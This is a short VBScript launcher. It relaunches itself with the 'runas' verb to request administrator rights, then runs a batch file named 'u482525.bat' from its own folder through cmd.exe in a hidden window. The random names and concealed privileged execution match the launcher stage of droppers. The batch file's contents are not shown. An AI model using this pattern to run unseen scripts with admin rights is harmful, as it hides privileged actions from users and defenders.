If Not WScript.Arguments.Named.Exists("u341427") Then
	Set sh = CreateObject("Shell.Application")
	sh.ShellExecute "wscript.exe", _
	"""" & WScript.ScriptFullName & """ /u341427", _
	"", _
	"runas", _
	1
	WScript.Quit
End If
Set fs = CreateObject("Scripting.FileSystemObject")
pp = fs.GetParentFolderName(WScript.ScriptFullName)
fp = pp & "\u482525.bat"
If fs.FileExists(fp) Then
	Set wshl = CreateObject("WScript.Shell")
	wshl.Run "cmd.exe /c " & Chr(34) & fp & Chr(34), 0
End If